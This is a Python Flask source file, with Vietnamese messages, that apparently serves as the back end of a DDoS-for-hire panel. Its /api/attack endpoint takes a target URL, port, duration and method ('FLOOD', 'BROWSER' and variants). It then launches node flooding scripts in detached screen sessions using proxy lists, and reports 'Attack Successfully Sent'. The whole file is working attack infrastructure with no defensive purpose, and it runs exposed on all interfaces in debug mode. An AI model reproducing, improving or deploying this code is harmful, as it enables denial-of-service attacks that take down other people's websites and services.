from flask import Flask, request, jsonify
import subprocess
import threading
from datetime import datetime
app = Flask(__name__)
@app.route('/api/attack', methods=['GET'])
def execute_tool():
    try:
        methods = request.args.get('methods', 'Methods')
        url = request.args.get('url', '')
        time = request.args.get('time', '')        
        mode = request.args.get('mode', '')
        port = request.args.get('port', '')        
        if not (methods and url and time and port):
            return jsonify({"error": "true", "msg": "Vui lòng nhập đầy đủ thông tin"}), 400
        valid_methods = [
            "FLOOD", "FLOODVN", "BROWSER", "BROWSERVN"
        ]        
        if methods not in valid_methods:
            return jsonify({"error": "true", "msg": "Methods không tồn tại hoặc bị thiếu vui lòng nhập lại"}), 400            
        def execute_command():
            if methods == "FLOOD":
                command = ['screen', '-dm', 'node', 'locflood', url ,time, '80', '5', 'http.txt']
            elif methods == "FLOODVN":
            	command = ['screen', '-dm', 'node', 'locflood', url ,time, '90', '5', 'httpvn.txt']
            elif methods == "BROWSER":
            	command = ['screen', '-dm', 'node', 'browser2', url, '100', 'http.txt' '64', time, 'true --fin true --load true --headers true --reconnect true']
            elif methods == "BROWSERVN":
            	command = ['screen', '-dm', 'node', 'browser2', url, '100', 'httpvn.txt' '64', time, 'true --fin true --load true --headers true --reconnect true']
            else:
                print(f"Sai Method: {methods}")
                return
            try:
                result = subprocess.run(command, capture_output=True, text=True, timeout=180)
                print(result.stdout)
                print(result.stderr)
            except subprocess.TimeoutExpired:
                print("Lệnh sent đã hết thời gian.")
            except Exception as e:
                print(f"Lỗi khi sent: {e}")
        threading.Thread(target=execute_command).start()
        result = {
            "Attack Details": {
                "Status": "Attack Successfully Sent",
                "Host": url,
                "Port": port,
                "Time": time,
                "Method": methods,
                "Sent On": datetime.now().strftime("%b %d %Y %H:%M:%S")
            }
        }
        return jsonify(result)
    except Exception as e:
        print(e)
        return jsonify({'error': 'Lỗi máy chủ nội bộ'}), 500
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80, debug=True)
